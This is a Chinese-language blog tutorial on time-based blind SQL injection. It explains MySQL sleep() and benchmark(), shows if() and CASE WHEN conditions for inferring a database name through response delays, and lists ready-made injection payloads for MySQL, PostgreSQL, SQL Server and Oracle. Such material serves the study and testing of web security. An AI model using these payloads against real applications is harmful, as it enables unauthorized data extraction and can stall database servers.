# 原创
：  【sql注入-延时注入】sleep()、benchmark()函数 延时注入

# 【sql注入-延时注入】sleep()、benchmark()函数 延时注入

**目录**

[sleep()、benchmark()延时注入](#extractvalue%28%29%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)

[一、语法介绍：](#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95%E4%BB%8B%E7%BB%8D%EF%BC%9A)

[二、延时注入](#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0)

[三、不同数据库](#%E4%B8%89%E3%80%81%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93)

[网络安全小圈子](#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B0%8F%E5%9C%88%E5%AD%90)

---


## sleep()、benchmark()延时注入

### 一、语法介绍：

版本：

sleep()    MySQL&gt;5.7.8

benchmark()  MySQL&gt;5.7.5

---


语法：

 

---


使用：

```
SELECT SLEEP(10);
```

延迟10s

 

```
SELECT BENCHMARK(1000000, SHA1('Hello World'));
```

查询将会执行100万次SHA1哈希算法计算，并返回结果（别瞎搞）

然后我又多加了一个0

 

---


---


### 二、延时注入

if示例：

加上判断函数if()

if(a,b,c)，如果a的值为true，则返回b的值，如果a的值为false，则返回c的值

```
?id=1’ and if ((ascii(substr(database(),0,1))&gt;100),sleep(10),1) --+

sleep(if(database()="security",10,0))
```

```
if(now()=sysdate(),sleep(length(database())),0)

//now(): 这是MySQL的一个内置函数，返回当前日期和时间。

//sysdate(): 这也是MySQL的一个内置函数，返回系统日期和时间。

//length(database()): 这是一个内置函数，返回当前数据库名的长度。

//sleep(): 这是MySQL的一个内置函数，用于在执行语句时暂停指定的秒数。

```

代码的逻辑：

如果now()返回的当前日期和时间与sysdate()返回的系统日期和时间相等（即条件成立），<br/> 那么执行sleep(length(database()))函数，即暂停秒数等于当前数据库名长度的时间，<br/> 否则返回0

---


case when示例

```
CASE WHEN condition1 THEN result1
WHEN condition2 THEN result2
ELSE result3
END
```

其中，condition1 和 condition2 是条件表达式，result1、result2 和 result3 是根据条件表达式返回的结果。如果所有条件都不满足，则返回 result3

```
'%3bselect case when (1=1) then sleep(10) else sleep(0) end --
```

这是一个条件语句，用于在查询中执行延时函数 sleep()。如果条件 (1=1) 成立，将执行 sleep(10) 函数，即暂停 10 秒钟；否则执行 sleep(0) 函数，即不进行延时

---


payload：

```
' OR SLEEP(5)#

' OR BENCHMARK(1000000,SHA1('test'))#

if(now()=sysdate(),sleep(length(database())),0)

'%3bselect case when (1=1) then pg_sleep(10) else pg_sleep(0) end --
```

---


### 三、不同数据库
1.  MySQL的`SLEEP()`函数：<br/>    - 函数作用：让数据库休眠指定的时间（以秒为单位）。<br/>    - Payload示例：`' OR SLEEP(5) --` 1.  PostgreSQL的`pg_sleep()`函数：<br/>    - 函数作用：让数据库休眠指定的时间（以秒为单位）。<br/>    - Payload示例：`' OR pg_sleep(5) --` 1.  Microsoft SQL Server的`WAITFOR DELAY`语句：<br/>    - 语句作用：让数据库休眠指定的时间（以毫秒为单位）。<br/>    - Payload示例：`' OR WAITFOR DELAY '0:0:5' --` 1.  Oracle的`DBMS_LOCK.SLEEP()`函数：<br/>    - 函数作用：让数据库休眠指定的时间（以秒为单位）。<br/>    - Payload示例：`' OR DBMS_LOCK.SLEEP(5) --` 
---


---


## 网络安全小圈子

[README.md · 书半生/网络安全知识体系-实战中心 - 码云 - 开源中国 (gitee.com)正在上传…重新上传取消https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md<img alt="icon-default.png?t=N658" src="https://csdnimg.cn/release/blog_editor_html/release2.3.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N658"/>https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md](https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md)

[GitHub - BLACKxZONE/Treasure_knowledge正在上传…重新上传取消https://github.com/BLACKxZONE/Treasure_knowledge<img alt="icon-default.png?t=N658" src="https://csdnimg.cn/release/blog_editor_html/release2.3.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N658"/>https://github.com/BLACKxZONE/Treasure_knowledge](https://github.com/BLACKxZONE/Treasure_knowledge)
